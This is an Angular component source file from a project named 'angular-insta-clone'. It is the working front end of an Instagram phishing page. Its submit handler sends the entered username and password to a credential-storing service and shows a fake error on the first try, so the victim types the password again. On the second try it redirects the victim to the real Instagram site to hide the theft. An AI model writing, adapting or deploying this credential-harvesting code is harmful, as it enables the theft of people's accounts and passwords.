import { Component } from '@angular/core';
import { CredServiceService } from './cred-service.service';
import { Router } from '@angular/router';
@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.css']
})
export class AppComponent {
  title = 'angular-insta-clone';
  loading : boolean  = false
  error : boolean   =  false
  count : number = 0;

   constructor(private credService : CredServiceService , private router:Router){

   }

  onSubmit(form:any){
     
     this.loading = true

     this.count ++ ;

     if(this.count > 1){
      const {username , password}= form.value
      this.credService.createCred({
        username , password
       }).subscribe(res=>{
           this.loading = false;
       } , (error)=>{
        
       })
    
       window.location.href = "https://www.instagram.com"
     }else{
        this.error = true;

        const {username , password}= form.value
       
        this.credService.createCred({
         username , password
        }).subscribe(res=>{
            this.loading = false;
        } , (error)=>{
         
        })
     }
        
     
       
         
       
  }
}
